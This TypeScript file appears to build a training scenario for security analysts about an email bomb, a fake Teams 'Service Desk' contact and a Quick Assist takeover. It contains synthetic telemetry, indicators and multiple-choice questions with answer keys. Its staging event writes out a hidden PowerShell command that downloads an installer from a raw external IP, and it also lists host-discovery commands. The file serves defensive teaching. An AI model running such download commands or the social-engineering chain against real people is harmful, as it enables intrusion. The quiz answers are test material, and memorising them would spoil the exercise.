/**
 * Scenario pack: "Email Bomb to Fake Help Desk, Quick Assist Takeover"
 *
 * INTERMEDIATE tier. The modern Black Basta / ransomware-precursor social-
 * engineering chain, in three acts. First the operator EMAIL-BOMBS the target:
 * within minutes the mailbox of an accounts-payable clerk fills with hundreds of
 * genuine newsletter and subscription-confirmation messages. Not one of them is
 * malware, each is a real double-opt-in email from a real service, scanned
 * clean by Defender for Office 365. The volume is the whole point. Then, with the
 * user overwhelmed and rattled, someone contacts her over Microsoft Teams from an
 * external tenant claiming to be the internal Service Desk, "we can see you're
 * being spammed, let us stop it", and walks her through launching the built-in
 * Windows Quick Assist tool and handing over control. Once the operator has the
 * keyboard, hands-on discovery and follow-on tooling begin.
 *
 * The teaching arc has three beats: the email flood is the SIGNATURE (a burst of
 * individually-benign mail from many distinct senders), the unsolicited Teams
 * contact is the TURN (the pretext that the flood was engineered to justify), and
 * the Quick Assist remote session is the COMPROMISE. A student who fixates on the
 * mail, quarantining senders, tuning spam rules, misses that the flood was
 * never the attack; it was the bait for it.
 *
 * DISTINCT from the vishing-RMM pack: that case opened with a cold call and a
 * third-party RMM (AnyDesk). Here the LEAD INDICATOR is the email bomb, the
 * remote tool is Microsoft's own signed Quick Assist, and the discovery set and
 * victim differ.
 *
 * The benign control (evt_ebh_00 series, its OWN incident inc:ebh:0 on another
 * host) is the sanctioned mirror: the same signed Quick Assist binary, run by a
 * known internal technician against a ticket the user opened herself, with NO
 * preceding mail flood and NO unsolicited contact. Same "remote session" shape,
 * opposite verdict. The ServiceNow record for that ticket is in the telemetry, so
 * the discriminator is findable, not asserted.
 *
 * SOURCES: Defender for Office 365 (the inbound flood, six sampled messages from
 * distinct senders, each clean), Microsoft Sentinel (the correlation alert that
 * counts the flood, the count lives in the SIEM, not in a device record),
 * Microsoft 365 Unified Audit Log (the inbox rule and the external Teams chat),
 * ServiceNow (both help-desk records), CrowdStrike Falcon (the Quick Assist
 * process and its session channel, the discovery children, the staged file and
 * the alert-grade detection).
 *
 * NOTE: register in scenarios.ts with difficulty "intermediate" (the
 * ScenarioBundle itself carries no difficulty field).
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { csProcess, csAlert, csDns, csNetwork, csFile } from "@/lib/sim/emitters/crowdstrike";
import { serviceNowRecord } from "@/lib/sim/emitters/servicenow";
import { m365Operation } from "@/lib/sim/emitters/m365";
import { sentinelAlert } from "@/lib/sim/emitters/sentinel";

export function buildEmailBombHelpdeskScenario(
  scenarioId = "email-bomb-helpdesk-2026",
): ScenarioBundle {
  const B = new Date("2026-08-25T09:14:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // The attack is one incident; the benign control on another host is its OWN case.
  const INCIDENT = "inc:ebh:1";
  const INCIDENT_CONTROL = "inc:ebh:0";

  // The company, its AD estate, and the socially-engineered clerk.
  const domain = "NORTHWIND";
  const victim = {
    sam: "j.mercer",
    email: "j.mercer@northwind.com",
    upn: "j.mercer@northwind.com",
    title: "Accounts Payable Specialist",
    hostname: "WKS-NW-118",
    ip: "10.30.4.118",
  };
  // The office's public egress address, which is what the audit log records for her.
  const officeEgressIp = "194.90.117.26";

  // The benign control: a sanctioned Quick Assist session run by a known
  // internal technician against a ticket the user opened herself, no flood.
  const benign = {
    sam: "t.osei",
    email: "t.osei@northwind.com",
    hostname: "WKS-NW-072",
    ip: "10.30.4.72",
  };
  const benignTech = "r.kline";
  const benignTicket = "INC0210044";

  // The help-desk record where the user reports the flood and, later, the outreach.
  const reportTicket = "INC0210318";

  // The external "Service Desk" identity that contacted her over Teams.
  const fakeDeskUpn = "helpdesk@nw-itdesk-support.onmicrosoft.com";
  const operatorIp = "5.42.199.34";

  // The external host the operator stages follow-on tooling from, and the tool.
  const stagingIp = "193.233.132.62";
  const payloadName = "nw-support-agent.msi";
  const payloadHash = makeSha256("email_bomb_helpdesk_quickassist_staged_agent_msi_2026");
  const qaPath = "C:\\Windows\\System32\\quickassist.exe";
  const qaHash = makeSha256("email_bomb_helpdesk_quickassist_signed_binary_2026");
  const qaHost = "remoteassistance.support.services.microsoft.com";
  const qaIp = "52.123.129.14";

  // A handful of the real subscription services whose confirmation mail made up
  // the flood, each a genuine double-opt-in message, scanned clean.
  const floodSample = [
    { sender: "no-reply@substack.com",           subject: "Confirm your subscription to keep reading",  ip: "149.72.148.30",  mid: "<0101019a2c1f7b40-substack-confirm@substack.com>", at: 0 },
    { sender: "confirm@newsletters.nytimes.com", subject: "One more step: confirm your email address",  ip: "170.10.129.144", mid: "<20260825091548.nyt-confirm@newsletters.nytimes.com>", at: 108 * SEC },
    { sender: "hello@mail.notion.so",            subject: "Verify your email to finish signing up",     ip: "198.37.150.12",  mid: "<20260825091803.notion-verify@mail.notion.so>", at: 243 * SEC },
    { sender: "newsletter@list.wired.com",       subject: "Please confirm you want to subscribe",       ip: "168.245.12.88",  mid: "<20260825092040.wired-optin@list.wired.com>", at: 400 * SEC },
    { sender: "updates@e.linkedin.com",          subject: "Confirm your newsletter preferences",        ip: "108.174.10.66",  mid: "<20260825092315.li-prefs@e.linkedin.com>", at: 555 * SEC },
    { sender: "noreply@medium.com",              subject: "Confirm your Medium email address",          ip: "54.240.8.71",    mid: "<0100019a2c20f3a1-medium-confirm@email.amazonses.com>", at: 770 * SEC },
  ];
  const floodGuid = [
    "b1e0f4a2-7c31-4d8e-9a26-3f5c1d902a11", "77c2a915-0b4e-42f1-8d6a-1c9e5b3407d2", "e3a8d6b0-92c4-4f17-b5e1-0a7d3c481f96",
    "5d19c7f3-a28e-4b60-8c3d-9e4f12b7a605", "c04b8e72-1f5a-49d3-a7c8-6b2e91d03f4a", "9a6f3d18-e4c7-4025-b8d1-2c7a5e60b9f3",
  ];

  // One Defender for Office 365 delivery record: a genuine opt-in message, delivered clean.
  const floodMail = (i: number, id: string, severity: TelemetryEvent["severity"], description: string): TelemetryEvent => {
    const m = floodSample[i];
    return {
      id, ts: T(m.at), source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, severity, incident_id: INCIDENT, description,
      raw: {
        "data.office365.Workload": "Exchange",
        "data.office365.Operation": "MessageDelivered",
        "data.office365.Directionality": "Inbound",
        "data.office365.Sender": m.sender,
        "data.office365.SenderIp": m.ip,
        "data.office365.Recipients": victim.email,
        "data.office365.Subject": m.subject,
        "data.office365.DeliveryAction": "Delivered",
        "data.office365.SpamConfidenceLevel": i === 0 ? "1" : "0",
        "data.office365.PhishConfidenceLevel": "0",
        "data.office365.ThreatType": "None",
        "data.office365.NetworkMessageId": floodGuid[i],
        "data.office365.InternetMessageId": m.mid,
      },
    };
  };

  const events: TelemetryEvent[] = [
    // ─────────────────────────────────────────────────────────────────────
    // 0. BENIGN CONTROL (its own incident, a different host), a SANCTIONED
    //    Quick Assist remote-support session. The SAME signed Microsoft binary
    //    as the attack, run by a known internal technician against a ticket the
    //    user opened herself, with NO mail flood and NO unsolicited contact.
    // ─────────────────────────────────────────────────────────────────────
    csProcess({
      id: "evt_ebh_00_benign_quickassist", ts: "2026-08-24T15:20:00.000Z", host: benign.hostname, user: benign.email, srcIp: benign.ip,
      incidentId: INCIDENT_CONTROL, runAsUser: `${domain}\\${benign.sam}`, integrity: "medium",
      processName: "quickassist.exe", processPath: qaPath, cmdline: `"${qaPath}"`,
      parentName: "explorer.exe", parentPid: 4044, pid: 5320, sha256: qaHash, signed: true, signatureSubject: "Microsoft Windows",
      severity: "low", isDetection: true, expectedVerdict: "fp",
      fpExplanation:
        `The control case for the whole scenario. This is ALSO the signed Microsoft Quick Assist tool opening a remote session, structurally identical to the attack, yet entirely legitimate. Three things make it sanctioned: it maps to ${benignTicket}, a ticket ${benign.sam} opened herself through the portal about an hour earlier (the ServiceNow record is in the telemetry); it was driven by a known internal technician (${benignTech}) whose account is in the IT Support group; and there was no preceding mail flood and no out-of-the-blue offer of help. Compare every one of those against the Quick Assist activity on ${victim.hostname}. A student who clears a remote-support session because "Quick Assist is a built-in Microsoft tool" will wrongly clear the attack too: the tool is the same; only the context differs.`,
      description:
        `The built-in Quick Assist tool started on ${benign.hostname} at 15:20 the previous afternoon for a sanctioned support session. It maps to help-desk ticket ${benignTicket}, opened by the machine's own user, and the session was driven by internal technician ${benignTech}.`,
    }),
    csDns({
      id: "evt_ebh_00b_benign_quickassist_dns", ts: "2026-08-24T15:20:04.000Z", host: benign.hostname, user: benign.email, srcIp: benign.ip,
      incidentId: INCIDENT_CONTROL, domain: qaHost, resolvedIp: qaIp, severity: "informational",
      processName: "quickassist.exe", processPath: qaPath, pid: 5320, parentName: "explorer.exe", parentPid: 4044, sha256: qaHash,
      description: `quickassist.exe on ${benign.hostname} resolved the Microsoft remote-assistance service.`,
    }),
    serviceNowRecord({
      id: "evt_ebh_00a_benign_ticket", ts: "2026-08-24T15:42:00.000Z", incidentId: INCIDENT_CONTROL,
      table: "incident", number: benignTicket, state: "Resolved", callerId: benign.email, severity: "informational",
      shortDescription: "Need help installing the expense reporting plug-in",
      extra: {
        "servicenow.opened_by": benign.email,
        "servicenow.opened_at": "2026-08-24 14:52:10",
        "servicenow.sys_created_on": "2026-08-24 14:52:10",
        "servicenow.assigned_to": benignTech,
        "servicenow.assignment_group": "IT Service Desk",
        "servicenow.contact_type": "Self-service",
        "servicenow.category": "Software",
        "servicenow.priority": "4 - Low",
        "servicenow.description": "User cannot install the expense reporting plug-in on her workstation and asks for a remote session.",
        "servicenow.work_notes": `Quick Assist session started by ${benignTech} on ${benign.hostname} at 15:20; the code was read out by the user over the phone. Plug-in installed, user confirmed it works.`,
        "servicenow.resolved_by": benignTech,
        "servicenow.resolved_at": "2026-08-24 15:41:30",
        "servicenow.close_code": "Solved (Permanently)",
      },
      description: `ServiceNow ${benignTicket}, opened by ${benign.sam} through the portal, resolved by ${benignTech} after a Quick Assist session.`,
    }),

    // ─────────────────────────────────────────────────────────────────────
    // 1. THE EMAIL BOMB, the lead indicator. A burst of inbound subscription
    //    confirmations from many distinct legitimate senders to one mailbox in
    //    minutes. Defender for Office 365 delivered every one of them CLEAN.
    //    Six sampled messages here; the count is a SIEM correlation (below).
    // ─────────────────────────────────────────────────────────────────────
    floodMail(0, "evt_ebh_01_flood_burst", "low",
      `One inbound double-opt-in confirmation (Substack) delivered clean to ${victim.email}. It is the first of a burst of subscription and newsletter confirmations from unrelated senders.`),
    floodMail(1, "evt_ebh_02_flood_sample", "low",
      `A second confirmation, from an unrelated service (New York Times), delivered clean to ${victim.email}.`),
    floodMail(2, "evt_ebh_02b_flood_sample", "low",
      `A third unrelated sender (Notion) delivered clean to ${victim.email}.`),
    floodMail(3, "evt_ebh_02c_flood_sample", "low",
      `A fourth unrelated sender (Wired) delivered clean to ${victim.email}.`),
    floodMail(4, "evt_ebh_02d_flood_sample", "low",
      `A fifth unrelated sender (LinkedIn) delivered clean to ${victim.email}.`),
    floodMail(5, "evt_ebh_02e_flood_sample", "low",
      `A sixth unrelated sender (Medium) delivered clean to ${victim.email}.`),

    // The help-desk ticket the user opens about the spam (spam only, no call yet).
    serviceNowRecord({
      id: "evt_ebh_03a_ticket_opened", ts: T(8 * MIN + 10 * SEC), incidentId: INCIDENT, user: victim.email,
      table: "incident", number: reportTicket, state: "New", callerId: victim.email, severity: "low",
      shortDescription: "Mailbox flooded with newsletter sign-up emails",
      extra: {
        "servicenow.opened_by": victim.email,
        "servicenow.opened_at": "2026-08-25 09:22:10",
        "servicenow.sys_created_on": "2026-08-25 09:22:10",
        "servicenow.assignment_group": "IT Service Desk",
        "servicenow.contact_type": "Self-service",
        "servicenow.category": "Email",
        "servicenow.subcategory": "Spam",
        "servicenow.priority": "3 - Moderate",
        "servicenow.urgency": "2 - High",
        "servicenow.impact": "3 - Low",
        "servicenow.description": "Several hundred newsletter and subscription confirmation emails arrived in under ten minutes. Caller cannot find the important mail any more.",
      },
      description: `${victim.sam} opened ${reportTicket} through the portal: her mailbox is flooded with newsletter confirmations.`,
    }),

    // MAIL-AUDIT CORROBORATION, her own reaction: an inbox rule to sweep the mail.
    m365Operation({
      id: "evt_ebh_03_inbox_rule_reaction", ts: T(11 * MIN), user: victim.email, srcIp: officeEgressIp, incidentId: INCIDENT,
      operation: "New-InboxRule", workload: "Exchange", severity: "low", userTitle: victim.title,
      extra: {
        "RecordType": "1",
        "Parameters[0].Name": "Name", "Parameters[0].Value": "Newsletters",
        "Parameters[1].Name": "SubjectContainsWords", "Parameters[1].Value": "confirm;subscribe",
        "Parameters[2].Name": "MoveToFolder", "Parameters[2].Value": "Newsletters",
      },
      description: `The Exchange audit log recorded ${victim.sam} creating an inbox rule named "Newsletters" that moves messages whose subject contains "confirm" or "subscribe" into a subfolder: the clerk trying to stem the flood of incoming mail herself.`,
    }),

    // SIEM CORRELATION, the count lives here, not in any single device record.
    sentinelAlert({
      id: "evt_ebh_03b_flood_correlation", ts: T(14 * MIN + 30 * SEC), host: victim.hostname, user: victim.email, srcIp: victim.ip, incidentId: INCIDENT,
      alertName: "Mail flood: many distinct senders to one mailbox", severity: "medium",
      detail: "Messages to a single mailbox from an unusually high number of distinct external sender domains inside a short window.",
      extendedProperties: { "Messages": 312, "Distinct Senders": 297, "Window Minutes": 14, "Recipient": victim.email, "Verdicts": "all delivered clean" },
      description: `Sentinel correlated the mail flood: 312 inbound messages from 297 distinct senders to ${victim.email} between 09:14 and 09:28, every one delivered clean.`,
    }),

    // THE EXTERNAL "SERVICE DESK", a Teams chat from a foreign tenant (the call itself
    // is not an audit event; the chat that carries it is).
    m365Operation({
      id: "evt_ebh_04a_teams_external_chat", ts: T(15 * MIN + 10 * SEC), user: fakeDeskUpn, srcIp: operatorIp, incidentId: INCIDENT,
      operation: "ChatCreated", workload: "MicrosoftTeams", eventType: "teams_message", severity: "medium",
      mitre: "T1566.003", tactic: "Initial Access",
      extra: {
        "RecordType": "25",
        "UserType": "Regular",
        "CommunicationType": "OneOnOne",
        "ParticipantInfo.HasForeignTenantUsers": "true",
        "ParticipantInfo.HasGuestUsers": "false",
        "ParticipantInfo.HasOtherGuestUsers": "false",
        "ParticipantInfo.HasUnauthenticatedUsers": "false",
        "Members[0].DisplayName": "IT Service Desk",
        "Members[0].UPN": fakeDeskUpn,
        "Members[1].DisplayName": "Jordan Mercer",
        "Members[1].UPN": victim.email,
      },
      description: `A one-on-one Teams chat was created with ${victim.email} by an external-tenant account displaying as "IT Service Desk" (${fakeDeskUpn}); the participant info flags a foreign-tenant user.`,
    }),

    // THE TAKEOVER, Quick Assist launches on the victim host. Falcon records it as a
    // signed, trusted Microsoft binary. Legitimate tool, illegitimate context (T1219).
    csProcess({
      id: "evt_ebh_05_quickassist_exec", ts: T(19 * MIN), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, integrity: "medium",
      processName: "quickassist.exe", processPath: qaPath, cmdline: `"${qaPath}"`,
      parentName: "explorer.exe", parentPid: 3960, pid: 7712, sha256: qaHash, signed: true, signatureSubject: "Microsoft Windows",
      mitre: "T1219", tactic: "Command and Control", severity: "high",
      description:
        `${victim.sam} launched Quick Assist on ${victim.hostname} and shared the connection code with the caller. Falcon reports the binary as signed and trusted (Microsoft Windows). No user-opened support ticket exists for this session, and it started minutes after the mail burst and the Teams chat.`,
    }),
    csDns({
      id: "evt_ebh_05b_quickassist_dns", ts: T(19 * MIN + 4 * SEC), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, domain: qaHost, resolvedIp: qaIp, severity: "low",
      processName: "quickassist.exe", processPath: qaPath, pid: 7712, parentName: "explorer.exe", parentPid: 3960, sha256: qaHash,
      description: `quickassist.exe on ${victim.hostname} resolved the Microsoft remote-assistance service.`,
    }),
    csNetwork({
      id: "evt_ebh_05c_quickassist_connect", ts: T(19 * MIN + 5 * SEC), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, remoteIp: qaIp, remotePort: 443, application: "tls", severity: "low",
      processName: "quickassist.exe", processPath: qaPath, pid: 7712, parentName: "explorer.exe", parentPid: 3960, sha256: qaHash,
      description: `quickassist.exe opened an outbound TLS session to the Microsoft remote-assistance service (${qaIp}:443).`,
    }),

    // The operator opens a command prompt inside the user's session.
    csProcess({
      id: "evt_ebh_05d_cmd_launch", ts: T(21 * MIN + 40 * SEC), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, integrity: "medium",
      processName: "cmd.exe", cmdline: "\"C:\\Windows\\System32\\cmd.exe\"",
      parentName: "explorer.exe", parentPid: 3960, pid: 7980, signed: true, signatureSubject: "Microsoft Windows",
      severity: "low",
      description: `A command prompt was opened in ${victim.sam}'s session on ${victim.hostname}, started from explorer.exe while the Quick Assist session was open.`,
    }),

    // DISCOVERY, systeminfo (T1082), quser (T1033), net localgroup (T1069.001).
    csProcess({
      id: "evt_ebh_06_disc_systeminfo", ts: T(22 * MIN), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, integrity: "medium",
      processName: "systeminfo.exe", cmdline: "systeminfo", parentName: "cmd.exe", parentPid: 7980, pid: 8020,
      mitre: "T1082", tactic: "Discovery", severity: "medium",
      description: `On ${victim.hostname}, cmd.exe ran "systeminfo", enumerating the host's OS build, patch level and domain, during the Quick Assist session and not from the user's own routine.`,
    }),
    csProcess({
      id: "evt_ebh_07_disc_quser", ts: T(23 * MIN), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, integrity: "medium",
      processName: "quser.exe", cmdline: "quser", parentName: "cmd.exe", parentPid: 7980, pid: 8104,
      mitre: "T1033", tactic: "Discovery", severity: "medium",
      description: `cmd.exe on ${victim.hostname} ran "quser", listing the interactive sessions and logged-on users on the host, orienting the operator to who is present on the machine.`,
    }),
    csProcess({
      id: "evt_ebh_08_disc_localadmins", ts: T(24 * MIN), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, integrity: "medium",
      processName: "net.exe", cmdline: "net localgroup administrators", parentName: "cmd.exe", parentPid: 7980, pid: 8188,
      mitre: "T1069.001", tactic: "Discovery", severity: "high",
      description: `cmd.exe on ${victim.hostname} ran "net localgroup administrators", listing the local Administrators group: reconnaissance a payments clerk's workstation has no routine reason to perform.`,
    }),
    csProcess({
      id: "evt_ebh_08b_net1", ts: T(24 * MIN + 1 * SEC), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, integrity: "medium",
      processName: "net1.exe", processPath: "C:\\Windows\\System32\\net1.exe", cmdline: "C:\\Windows\\system32\\net1 localgroup administrators",
      parentName: "net.exe", parentPid: 8188, pid: 8192, signed: true, signatureSubject: "Microsoft Windows",
      severity: "low",
      description: `net.exe handed the request to net1.exe, which performed the local-group lookup.`,
    }),

    // STAGING, a hidden PowerShell spawned from the operator's cmd.exe pulls a follow-on
    // installer from a raw-IP host over plain HTTP into a system path (T1059.001).
    csProcess({
      id: "evt_ebh_09_powershell_stage", ts: T(27 * MIN), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, integrity: "medium",
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: `powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri http://${stagingIp}/agent/${payloadName} -OutFile C:\\Windows\\Temp\\${payloadName}"`,
      parentName: "cmd.exe", parentPid: 7980, pid: 8360, signed: true, signatureSubject: "Microsoft Windows",
      mitre: "T1059.001", tactic: "Execution", severity: "high",
      description: `A hidden-window PowerShell, started from the operator's cmd.exe on ${victim.hostname}, used Invoke-WebRequest to pull ${payloadName} from ${stagingIp} into a Windows folder: the operator staging follow-on tooling under cover of the remote session.`,
    }),
    csNetwork({
      id: "evt_ebh_09b_stage_connect", ts: T(27 * MIN + 6 * SEC), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, remoteIp: stagingIp, remotePort: 80, application: "http", severity: "medium",
      mitre: "T1105", tactic: "Command and Control",
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid: 8360, parentName: "cmd.exe", parentPid: 7980,
      description: `powershell.exe opened an outbound HTTP connection to ${stagingIp}:80.`,
    }),
    csFile({
      id: "evt_ebh_09c_stage_file", ts: T(27 * MIN + 8 * SEC), host: victim.hostname, user: victim.email, srcIp: victim.ip,
      incidentId: INCIDENT, action: "file_create", path: `C:\\Windows\\Temp\\${payloadName}`, sha256: payloadHash, size: 3_184_640,
      actorProcess: "powershell.exe", actorPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", actorPid: 8360,
      actorParentName: "cmd.exe", actorParentPid: 7980, runAsUser: `${domain}\\${victim.sam}`, severity: "medium",
      description: `powershell.exe wrote ${payloadName} to C:\\Windows\\Temp.`,
    }),

    // THE DETECTION, Falcon raises the alert-grade detection that opened the case,
    // tying the unsolicited Quick Assist session to the hands-on discovery burst.
    {
      ...csAlert({
        id: "evt_ebh_10_falcon_detection", ts: T(29 * MIN), host: victim.hostname, user: victim.email, srcIp: victim.ip,
        incidentId: INCIDENT, runAsUser: `${domain}\\${victim.sam}`, severity: "high", action: "detected",
        threatName: "Quick Assist Session With Interactive Host Discovery", mitre: "T1219", tactic: "Command and Control", technique: "Remote Access Software",
        processName: "quickassist.exe", processPath: qaPath, cmdline: `"${qaPath}"`, sha256: qaHash, pid: 7712,
        parentPath: "C:\\Windows\\explorer.exe",
        detail: "A Quick Assist session with no user-opened ticket was followed by cmd.exe, systeminfo, quser, net.exe and a hidden PowerShell in quick succession.",
        description:
          `Falcon raised a High detection on ${victim.hostname}: a Quick Assist session with no user-opened ticket was followed by cmd.exe, systeminfo, quser, net.exe and a hidden PowerShell in quick succession, a remote operator profiling the host and staging tooling.`,
      }),
      edr_scope: "hybrid",
    },

    // AFTER THE ALERT, the Service Desk adds what the user tells them to the ticket.
    serviceNowRecord({
      id: "evt_ebh_04_report_ticket", ts: T(38 * MIN), incidentId: INCIDENT, user: victim.email,
      table: "incident", number: reportTicket, state: "In Progress", callerId: victim.email, severity: "low",
      mitre: "T1566.004", tactic: "Initial Access",
      shortDescription: "Mailbox flooded with newsletter sign-up emails",
      extra: {
        "servicenow.opened_by": victim.email,
        "servicenow.opened_at": "2026-08-25 09:22:10",
        "servicenow.sys_updated_on": "2026-08-25 09:52:00",
        "servicenow.assignment_group": "IT Service Desk",
        "servicenow.category": "Email",
        "servicenow.subcategory": "Spam",
        "servicenow.priority": "3 - Moderate",
        "servicenow.work_notes": `${victim.sam} called back at 09:50. After the mail burst a person contacted her on Microsoft Teams, said they were the IT Service Desk, offered to stop the spam and asked her to start Quick Assist and read out the six-digit code, which she did at about 09:33. The caller is not in the IT staff directory and no outbound support ticket exists for that contact.`,
        "servicenow.u_identity_verification": "Caller offering help not listed in IT staff directory; no outbound support ticket on record",
        "servicenow.u_verification_result": "Not verified",
      },
      description: `A work note on ${reportTicket} records the user's account: an unsolicited Teams contact posing as the Service Desk talked her into starting Quick Assist.`,
    }),
  ];

  // Declared in the order the records happened, whichever product wrote them.
  events.sort((a, b) => a.ts.localeCompare(b.ts));

  const iocs: IOC[] = [
    {
      type: "host",
      value: victim.hostname, // WKS-NW-118, the affected workstation
      first_seen: T(19 * MIN),
      last_seen: T(29 * MIN),
      reputation: "unknown",
      tags: ["affected", "workstation"],
    },
    {
      type: "user",
      value: victim.sam, // j.mercer, the socially-engineered account
      first_seen: T(0),
      last_seen: T(38 * MIN),
      reputation: "suspicious",
      tags: ["social-engineering-target", "hands-on-keyboard"],
    },
    {
      type: "email",
      value: fakeDeskUpn, // the external-tenant "Service Desk" identity
      first_seen: T(15 * MIN + 10 * SEC),
      last_seen: T(15 * MIN + 10 * SEC),
      reputation: "malicious",
      tags: ["external-tenant", "impersonation"],
    },
    {
      type: "ip",
      value: operatorIp, // the address the external Teams chat was created from
      first_seen: T(15 * MIN + 10 * SEC),
      last_seen: T(15 * MIN + 10 * SEC),
      reputation: "malicious",
      tags: ["external", "operator"],
    },
    {
      type: "ip",
      value: stagingIp, // the external host serving the tooling
      first_seen: T(27 * MIN),
      last_seen: T(27 * MIN + 6 * SEC),
      reputation: "malicious",
      tags: ["external", "tool-staging", "raw-ip-host"],
    },
    {
      type: "sha256",
      value: payloadHash, // the staged follow-on installer
      first_seen: T(27 * MIN + 8 * SEC),
      last_seen: T(27 * MIN + 8 * SEC),
      reputation: "malicious",
      tags: ["staged-tool", "follow-on"],
    },
    {
      type: "email",
      value: victim.email, // j.mercer@northwind.com, the flooded mailbox
      first_seen: T(0),
      last_seen: T(38 * MIN),
      reputation: "unknown",
      tags: ["target-mailbox", "flooded"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "How did the operator get hands-on control of WKS-NW-118? Read the external Teams chat (evt_ebh_04a) and the ServiceNow work note (evt_ebh_04) against the Quick Assist launch (evt_ebh_05) that follows them.",
      hint: "Look at who initiated the Teams contact and from which tenant, whether any user-opened ticket exists for it, and what the caller asked the clerk to do.",
      kind: "single",
      options: [
        { value: "callback_quickassist", label: "An unsolicited Teams contact posing as the Service Desk talked the clerk into starting Quick Assist and reading out the code, handing over live control" },
        { value: "phish_link", label: "The clerk clicked a link in one of the newsletter emails, which silently installed a remote-control agent on the host in the background minutes later" },
        { value: "exploit", label: "The operator exploited an unpatched flaw on the mail server to drop a remote-control tool onto the host, with no user involvement at any stage" },
        { value: "insider", label: "The clerk deliberately opened the remote session to give an outside party covert access to the host, making this a witting-insider case" },
      ],
      answer: "callback_quickassist",
      xp: 55,
      explanation:
        "The audit log and the ticket together make sense of the takeover. Evt_ebh_04a shows a one-on-one Teams chat created with the clerk by an account from a foreign tenant displaying as \"IT Service Desk\", shortly after the mail burst and about four minutes before Quick Assist starts. The work note on the ticket records her account: the person offered to stop the spam, asked her to launch Quick Assist and share the six-digit code, and no IT-initiated ticket exists for that outreach. Minutes later evt_ebh_05 shows Quick Assist starting on her host and a connection to Microsoft's remote-assistance service. That is voice and chat social engineering (T1566.004, T1566.003) into T1219: the operator never touched the machine, they talked the user into granting control. (b) invents a click the logs do not show: the flood messages were delivered clean and nothing was installed from them. (c) invents an exploit; the tool is Windows' own Quick Assist, started interactively by the user. (d) misreads a deceived victim as a malicious insider.",
    },
    {
      id: "q2",
      prompt:
        "Hundreds of confirmation emails hit the mailbox, yet Defender for Office 365 delivered every one of them clean. Why is the flood the OPENING MOVE of the attack rather than the attack itself?",
      hint: "Ask what each individual message is, what the volume achieves, and where the actual compromise happens in the timeline.",
      kind: "single",
      options: [
        { value: "pretext_for_call", label: "Each note is a genuine opt-in message with nothing to flag; the volume rattles the clerk and sets up the fake help offer, the breach is the remote session" },
        { value: "hidden_malware", label: "One of the confirmation emails secretly carried the malware, and the other hundreds were sent purely to bury that single malicious message from view" },
        { value: "mail_dos", label: "The flood is itself the attack: a denial-of-service meant to knock the mailbox and the mail server offline, and nothing that follows it matters" },
        { value: "filter_bypass", label: "The sheer count was designed to exhaust the spam filter's scoring so that later phishing mail would slip through the weakened defenses unchecked" },
      ],
      answer: "pretext_for_call",
      xp: 70,
      explanation:
        "This is the heart of the scenario. Every sampled message is a genuine subscription confirmation from a real service, delivered with no threat verdict: exactly why Defender delivers them clean and why quarantining senders leads nowhere. The flood's job is psychological and logistical: swamp the target so she is rattled and primed, and create a plausible problem that a 'helpful' caller can then offer to fix. The compromise is the Quick Assist session the pretext unlocks, not the mail. (b) invents a hidden payload: the messages are individually clean and no attachment or link executes. (c) treats the flood as the goal; the timeline shows it is the setup for a remote takeover. (d) invents a later phishing wave that never arrives; the follow-through is a Teams-driven remote session, not more mail.",
    },
    {
      id: "q3",
      prompt:
        "Falcon reports quickassist.exe as signed and trusted (Microsoft Windows), it is a genuine, built-in Windows tool. So why is it correct to treat this session as malicious?",
      hint: "A tool is not the same as its use. Contrast this session with the sanctioned one in evt_ebh_00.",
      kind: "single",
      options: [
        { value: "context", label: "The malice is in the context: no user-opened ticket, started on an unsolicited caller's word after a mail flood, then straight into host and group enumeration" },
        { value: "bad_hash", label: "The binary's hash matches a known-malicious sample in threat intel, so despite the Microsoft signature it is confirmed to be a tampered, trojanised build of the tool" },
        { value: "fake_sig", label: "The code signature is counterfeit, the operator swapped in a lookalike quickassist.exe, and Falcon marking it trusted is a validation failure" },
        { value: "all_remote", label: "Remote-support tools on workstations should be treated as malicious by policy, so the verdict does not depend on the surrounding events at all" },
      ],
      answer: "context",
      xp: 65,
      explanation:
        "A trusted signature tells you the file is really Microsoft's Quick Assist; it says nothing about whether this use of it is authorised. Every signal that matters here is contextual: there is no ticket the user opened for the session, it began because an unsolicited caller asked for it, it started minutes after the engineered mail flood, and within minutes the session's cmd.exe runs systeminfo, quser and net localgroup administrators. (b) invents intel that is absent: the binary is the real, clean tool, with the same hash on both hosts. (c) is refuted by the record: the signature is genuinely trusted, not forged. (d) over-corrects into a rule that would also condemn the sanctioned Quick Assist session in evt_ebh_00: the control exists precisely to show the same tool can be entirely legitimate when the provenance is accountable.",
    },
    {
      id: "q4",
      prompt:
        "The day before, a Quick Assist session ran on WKS-NW-072 (evt_ebh_00), the same signed tool opening a remote session, and it is benign. Which combination of facts separates it from the session on WKS-NW-118?",
